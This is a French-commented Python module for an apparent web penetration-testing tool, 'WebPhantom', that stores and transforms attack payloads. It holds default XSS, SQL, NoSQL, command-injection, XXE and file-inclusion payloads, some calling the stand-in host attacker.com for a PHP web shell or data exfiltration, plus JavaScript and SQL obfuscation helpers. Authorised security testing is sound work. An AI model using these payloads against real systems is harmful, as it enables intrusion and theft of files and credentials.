"""
Module de génération de charges utiles personnalisées pour WebPhantom.
Ce module permet de créer, gérer et utiliser des charges utiles (payloads)
personnalisées pour différents types d'attaques et de tests de pénétration.
"""

import os
import re
import json
import random
import string
import base64
import logging
import hashlib
import urllib.parse
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Configuration du logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("payload_generator")

# Répertoire pour stocker les charges utiles personnalisées
PAYLOADS_DIR = os.path.expanduser("~/.webphantom/payloads")

# Catégories de charges utiles
PAYLOAD_CATEGORIES = {
    "xss": "Cross-Site Scripting",
    "sqli": "SQL Injection",
    "lfi": "Local File Inclusion",
    "rfi": "Remote File Inclusion",
    "csrf": "Cross-Site Request Forgery",
    "ssrf": "Server-Side Request Forgery",
    "xxe": "XML External Entity",
    "rce": "Remote Code Execution",
    "ssti": "Server-Side Template Injection",
    "jwt": "JWT Attacks",
    "nosqli": "NoSQL Injection",
    "custom": "Custom Payloads"
}

# Charges utiles par défaut
DEFAULT_PAYLOADS = {
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=\"javascript:alert('XSS')\"></iframe>"
    ],
    "sqli": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT username,password,3 FROM users --"
    ],
    "lfi": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "/proc/self/environ"
    ],
    "rfi": [
        "http://attacker.com/shell.php",
        "https://attacker.com/shell.php",
        "ftp://attacker.com/shell.php",
        "//attacker.com/shell.php",
        "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
    ],
    "csrf": [
        "<img src='https://victim.com/transfer?to=attacker&amount=1000'>",
        "<form action='https://victim.com/transfer' method='POST'><input type='hidden' name='to' value='attacker'><input type='hidden' name='amount' value='1000'><input type='submit' value='Click me'></form>",
        "<script>fetch('https://victim.com/transfer?to=attacker&amount=1000')</script>"
    ],
    "ssrf": [
        "http://localhost/admin",
        "http://127.0.0.1/admin",
        "http://[::1]/admin",
        "http://internal-service/api",
        "file:///etc/passwd"
    ],
    "xxe": [
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>",
        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><data>&send;</data>"
    ],
    "rce": [
        ";ls -la",
        "& cat /etc/passwd",
        "| id",
        "$(id)",
        "`id`"
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{7*7}"
    ],
    "jwt": [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    ],
    "nosqli": [
        "username[$ne]=admin&password[$ne]=",
        "username[$regex]=^adm&password[$ne]=",
        "username[$exists]=true",
        "{\"username\": {\"$ne\": null}}",
        "{\"username\": {\"$in\": [\"admin\", \"root\", \"superuser\"]}}"
    ]
}

class PayloadGenerator:
    """Classe pour la génération et la gestion des charges utiles."""
    
    def __init__(self, payloads_dir=PAYLOADS_DIR):
        self.payloads_dir = payloads_dir
        os.makedirs(self.payloads_dir, exist_ok=True)
        self._init_payloads()
    
    def _init_payloads(self):
        """Initialise les charges utiles par défaut si elles n'existent pas."""
        for category, payloads in DEFAULT_PAYLOADS.items():
            category_dir = os.path.join(self.payloads_dir, category)
            os.makedirs(category_dir, exist_ok=True)
            
            # Créer le fichier de charges utiles par défaut
            default_file = os.path.join(category_dir, "default.json")
            if not os.path.exists(default_file):
                with open(default_file, "w") as f:
                    json.dump({
                        "name": f"Default {PAYLOAD_CATEGORIES.get(category, category.upper())} Payloads",
                        "description": f"Charges utiles par défaut pour {PAYLOAD_CATEGORIES.get(category, category.upper())}",
                        "payloads": payloads
                    }, f, indent=2)
    
    def get_categories(self):
        """
        Récupère la liste des catégories de charges utiles.
        
        Returns:
            dict: Dictionnaire des catégories
        """
        return PAYLOAD_CATEGORIES
    
    def get_payload_sets(self, category=None):
        """
        Récupère les ensembles de charges utiles.
        
        Args:
            category: Catégorie de charges utiles (optionnel)
            
        Returns:
            dict: Dictionnaire des ensembles de charges utiles
        """
        result = {}
        
        if category:
            category_dir = os.path.join(self.payloads_dir, category)
            if not os.path.exists(category_dir):
                logger.warning(f"Catégorie de charges utiles inexistante: {category}")
                return {}
            
            # Récupérer les fichiers JSON dans la catégorie
            for file_name in os.listdir(category_dir):
                if file_name.endswith(".json"):
                    file_path = os.path.join(category_dir, file_name)
                    try:
                        with open(file_path, "r") as f:
                            payload_set = json.load(f)
                            set_name = file_name[:-5]  # Supprimer l'extension .json
                            result[set_name] = payload_set
                    except Exception as e:
                        logger.error(f"Erreur lors de la lecture du fichier {file_path}: {e}")
        else:
            # Récupérer toutes les catégories
            for category in os.listdir(self.payloads_dir):
                category_dir = os.path.join(self.payloads_dir, category)
                if os.path.isdir(category_dir):
                    result[category] = {}
                    
                    # Récupérer les fichiers JSON dans la catégorie
                    for file_name in os.listdir(category_dir):
                        if file_name.endswith(".json"):
                            file_path = os.path.join(category_dir, file_name)
                            try:
                                with open(file_path, "r") as f:
                                    payload_set = json.load(f)
                                    set_name = file_name[:-5]  # Supprimer l'extension .json
                                    result[category][set_name] = payload_set
                            except Exception as e:
                                logger.error(f"Erreur lors de la lecture du fichier {file_path}: {e}")
        
        return result
    
    def get_payloads(self, category, set_name="default"):
        """
        Récupère les charges utiles d'un ensemble.
        
        Args:
            category: Catégorie de charges utiles
            set_name: Nom de l'ensemble de charges utiles (par défaut: "default")
            
        Returns:
            list: Liste des charges utiles
        """
        file_path = os.path.join(self.payloads_dir, category, f"{set_name}.json")
        if not os.path.exists(file_path):
            logger.warning(f"Ensemble de charges utiles inexistant: {category}/{set_name}")
            return []
        
        try:
            with open(file_path, "r") as f:
                payload_set = json.load(f)
                return payload_set.get("payloads", [])
        except Exception as e:
            logger.error(f"Erreur lors de la lecture du fichier {file_path}: {e}")
            return []
    
    def create_payload_set(self, category, set_name, name, description, payloads):
        """
        Crée un nouvel ensemble de charges utiles.
        
        Args:
            category: Catégorie de charges utiles
            set_name: Nom de l'ensemble de charges utiles
            name: Nom complet de l'ensemble
            description: Description de l'ensemble
            payloads: Liste des charges utiles
            
        Returns:
            bool: True si la création a réussi, False sinon
        """
        # Vérifier que la catégorie existe
        if category not in PAYLOAD_CATEGORIES and category != "custom":
            logger.error(f"Catégorie de charges utiles invalide: {category}")
            return False
        
        # Créer le répertoire de la catégorie s'il n'existe pas
        category_dir = os.path.join(self.payloads_dir, category)
        os.makedirs(category_dir, exist_ok=True)
        
        # Créer le fichier de charges utiles
        file_path = os.path.join(category_dir, f"{set_name}.json")
        
        try:
            with open(file_path, "w") as f:
                json.dump({
                    "name": name,
                    "description": description,
                    "payloads": payloads
                }, f, indent=2)
            
            logger.info(f"Ensemble de charges utiles créé: {category}/{set_name}")
            return True
        except Exception as e:
            logger.error(f"Erreur lors de la création de l'ensemble de charges utiles: {e}")
            return False
    
    def update_payload_set(self, category, set_name, **kwargs):
        """
        Met à jour un ensemble de charges utiles.
        
        Args:
            category: Catégorie de charges utiles
            set_name: Nom de l'ensemble de charges utiles
            **kwargs: Champs à mettre à jour (name, description, payloads)
            
        Returns:
            bool: True si la mise à jour a réussi, False sinon
        """
        file_path = os.path.join(self.payloads_dir, category, f"{set_name}.json")
        if not os.path.exists(file_path):
            logger.warning(f"Ensemble de charges utiles inexistant: {category}/{set_name}")
            return False
        
        try:
            # Lire l'ensemble existant
            with open(file_path, "r") as f:
                payload_set = json.load(f)
            
            # Mettre à jour les champs
            if "name" in kwargs:
                payload_set["name"] = kwargs["name"]
            
            if "description" in kwargs:
                payload_set["description"] = kwargs["description"]
            
            if "payloads" in kwargs:
                payload_set["payloads"] = kwargs["payloads"]
            
            # Sauvegarder l'ensemble mis à jour
            with open(file_path, "w") as f:
                json.dump(payload_set, f, indent=2)
            
            logger.info(f"Ensemble de charges utiles mis à jour: {category}/{set_name}")
            return True
        except Exception as e:
            logger.error(f"Erreur lors de la mise à jour de l'ensemble de charges utiles: {e}")
            return False
    
    def delete_payload_set(self, category, set_name):
        """
        Supprime un ensemble de charges utiles.
        
        Args:
            category: Catégorie de charges utiles
            set_name: Nom de l'ensemble de charges utiles
            
        Returns:
            bool: True si la suppression a réussi, False sinon
        """
        file_path = os.path.join(self.payloads_dir, category, f"{set_name}.json")
        if not os.path.exists(file_path):
            logger.warning(f"Ensemble de charges utiles inexistant: {category}/{set_name}")
            return False
        
        try:
            os.remove(file_path)
            logger.info(f"Ensemble de charges utiles supprimé: {category}/{set_name}")
            return True
        except Exception as e:
            logger.error(f"Erreur lors de la suppression de l'ensemble de charges utiles: {e}")
            return False
    
    def get_random_payload(self, category, set_name="default"):
        """
        Récupère une charge utile aléatoire d'un ensemble.
        
        Args:
            category: Catégorie de charges utiles
            set_name: Nom de l'ensemble de charges utiles (par défaut: "default")
            
        Returns:
            str: Charge utile aléatoire ou None si l'ensemble est vide
        """
        payloads = self.get_payloads(category, set_name)
        if not payloads:
            return None
        
        return random.choice(payloads)
    
    def generate_custom_payload(self, template, **kwargs):
        """
        Génère une charge utile personnalisée à partir d'un template.
        
        Args:
            template: Template de charge utile avec des placeholders {variable}
            **kwargs: Variables à remplacer dans le template
            
        Returns:
            str: Charge utile générée
        """
        try:
            return template.format(**kwargs)
        except KeyError as e:
            logger.error(f"Variable manquante dans le template: {e}")
            return template
        except Exception as e:
            logger.error(f"Erreur lors de la génération de la charge utile: {e}")
            return template

class PayloadTransformer:
    """Classe pour la transformation des charges utiles."""
    
    @staticmethod
    def url_encode(payload, double=False):
        """
        Encode une charge utile en URL.
        
        Args:
            payload: Charge utile à encoder
            double: Si True, effectue un double encodage
            
        Returns:
            str: Charge utile encodée
        """
        encoded = urllib.parse.quote(payload)
        if double:
            encoded = urllib.parse.quote(encoded)
        return encoded
    
    @staticmethod
    def html_encode(payload):
        """
        Encode une charge utile en HTML.
        
        Args:
            payload: Charge utile à encoder
            
        Returns:
            str: Charge utile encodée
        """
        return payload.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;").replace("'", "&#x27;")
    
    @staticmethod
    def base64_encode(payload):
        """
        Encode une charge utile en Base64.
        
        Args:
            payload: Charge utile à encoder
            
        Returns:
            str: Charge utile encodée
        """
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def hex_encode(payload):
        """
        Encode une charge utile en hexadécimal.
        
        Args:
            payload: Charge utile à encoder
            
        Returns:
            str: Charge utile encodée
        """
        return "".join(f"\\x{ord(c):02x}" for c in payload)
    
    @staticmethod
    def unicode_encode(payload):
        """
        Encode une charge utile en Unicode.
        
        Args:
            payload: Charge utile à encoder
            
        Returns:
            str: Charge utile encodée
        """
        return "".join(f"\\u{ord(c):04x}" for c in payload)
    
    @staticmethod
    def encrypt_aes(payload, key):
        """
        Chiffre une charge utile avec AES.
        
        Args:
            payload: Charge utile à chiffrer
            key: Clé de chiffrement (doit être de 16, 24 ou 32 octets)
            
        Returns:
            str: Charge utile chiffrée (en Base64)
        """
        try:
            # S'assurer que la clé a la bonne longueur
            if len(key) not in (16, 24, 32):
                key = hashlib.sha256(key.encode()).digest()[:32]
            else:
                key = key.encode()
            
            # Chiffrer la charge utile
            cipher = AES.new(key, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(payload.encode(), AES.block_size))
            iv = base64.b64encode(cipher.iv).decode()
            ct = base64.b64encode(ct_bytes).decode()
            return f"{iv}:{ct}"
        except Exception as e:
            logger.error(f"Erreur lors du chiffrement AES: {e}")
            return payload
    
    @staticmethod
    def decrypt_aes(encrypted_payload, key):
        """
        Déchiffre une charge utile avec AES.
        
        Args:
            encrypted_payload: Charge utile chiffrée (en Base64)
            key: Clé de chiffrement (doit être de 16, 24 ou 32 octets)
            
        Returns:
            str: Charge utile déchiffrée
        """
        try:
            # S'assurer que la clé a la bonne longueur
            if len(key) not in (16, 24, 32):
                key = hashlib.sha256(key.encode()).digest()[:32]
            else:
                key = key.encode()
            
            # Déchiffrer la charge utile
            iv, ct = encrypted_payload.split(":")
            iv = base64.b64decode(iv)
            ct = base64.b64decode(ct)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size)
            return pt.decode()
        except Exception as e:
            logger.error(f"Erreur lors du déchiffrement AES: {e}")
            return encrypted_payload
    
    @staticmethod
    def obfuscate_js(payload):
        """
        Obfusque une charge utile JavaScript.
        
        Args:
            payload: Charge utile JavaScript à obfusquer
            
        Returns:
            str: Charge utile obfusquée
        """
        try:
            # Méthode simple d'obfuscation: convertir en Unicode
            return "eval('" + "".join(f"\\x{ord(c):02x}" for c in payload) + "')"
        except Exception as e:
            logger.error(f"Erreur lors de l'obfuscation JavaScript: {e}")
            return payload
    
    @staticmethod
    def obfuscate_sql(payload):
        """
        Obfusque une charge utile SQL.
        
        Args:
            payload: Charge utile SQL à obfusquer
            
        Returns:
            str: Charge utile obfusquée
        """
        try:
            # Méthode simple d'obfuscation: ajouter des commentaires et des espaces
            # Préserver les mots-clés SQL pour les tests
            sql_keywords = ["SELECT", "FROM", "WHERE", "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER"]
            result = payload
            
            # Ajouter des commentaires aléatoires entre les caractères
            chars = list(result)
            for i in range(len(chars) - 1, 0, -1):
                if random.random() < 0.2:
                    chars.insert(i, f"/*{random.randint(1000, 9999)}*/")
            
            result = "".join(chars)
            
            # Ajouter des espaces aléatoires
            result = re.sub(r'\s+', lambda m: ' ' * random.randint(1, 5), result)
            
            return result
        except Exception as e:
            logger.error(f"Erreur lors de l'obfuscation SQL: {e}")
            return payload

def run(category=None, set_name=None, transform=None):
    """
    Point d'entrée principal pour la génération de charges utiles.
    
    Args:
        category: Catégorie de charges utiles (optionnel)
        set_name: Nom de l'ensemble de charges utiles (optionnel)
        transform: Transformation à appliquer (optionnel)
    """
    generator = PayloadGenerator()
    transformer = PayloadTransformer()
    
    if not category:
        # Afficher les catégories disponibles
        print("[*] Catégories de charges utiles disponibles:")
        for cat_id, cat_name in PAYLOAD_CATEGORIES.items():
            print(f"  - {cat_id}: {cat_name}")
        return
    
    if category not in PAYLOAD_CATEGORIES and category != "custom":
        print(f"[!] Catégorie de charges utiles invalide: {category}")
        return
    
    if not set_name:
        # Afficher les ensembles disponibles dans la catégorie
        print(f"[*] Ensembles de charges utiles disponibles pour {category}:")
        payload_sets = generator.get_payload_sets(category)
        for set_id, payload_set in payload_sets.items():
            print(f"  - {set_id}: {payload_set.get('name', set_id)}")
        return
    
    # Récupérer les charges utiles
    payloads = generator.get_payloads(category, set_name)
    
    if not payloads:
        print(f"[!] Aucune charge utile trouvée pour {category}/{set_name}")
        return
    
    print(f"[*] Charges utiles pour {category}/{set_name}:")
    
    for i, payload in enumerate(payloads):
        # Appliquer la transformation si demandée
        if transform:
            if transform == "url":
                payload = transformer.url_encode(payload)
            elif transform == "url2":
                payload = transformer.url_encode(payload, double=True)
            elif transform == "html":
                payload = transformer.html_encode(payload)
            elif transform == "base64":
                payload = transformer.base64_encode(payload)
            elif transform == "hex":
                payload = transformer.hex_encode(payload)
            elif transform == "unicode":
                payload = transformer.unicode_encode(payload)
            elif transform == "js_obfuscate":
                payload = transformer.obfuscate_js(payload)
            elif transform == "sql_obfuscate":
                payload = transformer.obfuscate_sql(payload)
        
        print(f"  {i+1}. {payload}")

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1:
        category = sys.argv[1]
        set_name = sys.argv[2] if len(sys.argv) > 2 else None
        transform = sys.argv[3] if len(sys.argv) > 3 else None
        run(category, set_name, transform)
    else:
        run()
